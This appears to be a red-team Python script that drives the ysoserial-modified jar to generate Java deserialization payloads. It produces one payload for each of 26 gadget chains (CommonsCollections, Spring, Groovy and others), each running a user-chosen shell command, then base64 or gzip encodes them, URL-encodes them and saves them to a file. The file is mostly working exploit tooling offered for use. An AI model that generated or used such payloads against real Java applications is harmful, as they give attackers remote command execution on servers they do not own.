import os, re, argparse
from subprocess import run, check_output
import subprocess
from urllib.parse import quote
def banner():

	menu = """
	[ Java serialized payload generator ]
	[ github.com/brianszn ]

	ex: python3 bla.py --path "/home/s1xdev/brn/red/ysoserial-modified/target/" --b64 --cmd whoami
	ex: python3 bla.py --path "/home/s1xdev/brn/red/ysoserial-modified/target/" --gzp --cmd whoami

	obs: "ysoserial-modified.jar" default name of ysoserial jar archive in the path.
	obs: Payloads converted in URL.

	"""
	return menu

print(banner())

parser = argparse.ArgumentParser()
parser.add_argument('--b64', action='store_true', help='rO0 in Base64')
parser.add_argument('--gzp', action='store_true', help='H4sIA" when gzip(base64)')
parser.add_argument('--path', help='ysoerial-modified.jar Path', required=True)
parser.add_argument('--cmd', help='command to exec', required=True)
args = parser.parse_args()
path = args.path
cmd = args.cmd

gadgets = ['CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 
'FileUpload1', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JRMPListener', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 
'Jython1', 'MozillaRhino1', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Wicket1', 'BeanShell1', 'C3P0']

def regex_file(output): #regex para remover mensagens desnecessárias da nossa payload.
	regex = "WARNING:.*"
	apply_regex = re.sub(regex, "", output)
	clean_regex = apply_regex.lstrip("\n")
	with open('payload_list.txt', 'a') as file:
		file.write(quote(clean_regex, '\n'))


def output_subprocess(ysoserial_command): #subprocess, executando o ysoserial.
	output = check_output(ysoserial_command, shell=True).decode('utf-8');os.system('clear');print(banner())
	return output


def b64(): #criando payload com base64 padrão rO0
	ysoserial_command = f"java -jar {path}ysoserial-modified.jar {gad} bash '{cmd}' | base64 -w0;echo"
	output = output_subprocess(ysoserial_command)
	regex_file(output)


def gzp(): #criando payload com base64 padrão H4s
	ysoserial_command = f"java -jar {path}ysoserial-modified.jar {gad} bash '{cmd}' |base64 |gzip -c | base64 -w0;echo"
	output = output_subprocess(ysoserial_command)
	regex_file(output)


if args.b64:
	for gad in gadgets:
		b64()
elif args.gzp:
	for gad in gadgets:
		gzp()

print("""

Payloads converted in URL.
created: payload_list.txt

:)

	""")

"""

	output = check_output(ysoserial_command, shell=True).decode('utf-8');os.system('clear');print(banner())
	regex = "WARNING:.*"
	apply_regex = re.sub(regex, "", output)
	clean_regex = apply_regex.lstrip("\n")

	with open('teste.txt', 'w') as file:
		file.write(clean_regex)

"""
